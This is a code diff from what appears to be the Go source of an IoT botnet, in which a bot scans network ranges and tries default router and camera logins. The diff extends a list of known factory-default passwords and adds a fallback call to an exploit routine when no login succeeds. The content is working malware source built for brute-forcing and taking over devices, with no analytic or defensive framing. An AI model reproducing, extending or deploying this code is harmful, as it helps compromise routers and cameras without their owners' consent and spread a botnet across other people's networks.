@@ -23,7 +23,7 @@ var (
 		Add more usernames and passwords in to the slice name "userList" and "paswdList".
 	*/
 	userList  = []string{"admin", "root", "user", "guest", "support", "login", "zyfwp", "ZXDSL"}
-	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "password", "default", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "pass", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "jiocentrum", "hslwificam", "cxlinux", "jvbzd", "ZXDSL", "vizxv", "xmhdipc", "zlxx", "hi3518", "admin1234", "1001chin", "klv123", "oelinux123", "klv1234", "xc3511", "Zte521", "7ujMko0admin", "7ujMko0vizxv", "PrOw!aN_fXp", "W!n0&oO7."}
+	paswdList = []string{"", "admin", "root", "user", "guest", "support", "login", "password", "default", "pass", "1234", "12345", "123456", "12345678", "123456789", "1234567890", "54321", "123123", "888888", "666666", "00000000", "1111", "111111", "1111111", "ikwb", "system", "juantech", "realtek", "smcadmin", "jiocentrum", "hslwificam", "cxlinux", "jvbzd", "ZXDSL", "vizxv", "xmhdipc", "zlxx", "hi3518", "admin1234", "Admin1234", "admin12345", "Admin12345", "1001chin", "klv123", "oelinux123", "klv1234", "xc3511", "Zte521", "7ujMko0admin", "7ujMko0vizxv", "PrOw!aN_fXp", "W!n0&oO7."}
 )
 
 var ChinaNetwork = []string{
@@ -292,6 +292,7 @@ func (b *Bot) setupScanner(scanNetwork []string, isRandom bool, nCores string) b
 						if paswd == len(paswdList)-1 {
 							if !isLogin {
 								b.Report(nCores + " No auth match: " + b.tempIP)
+								b.exploitList()
 							}
 						}
 					}
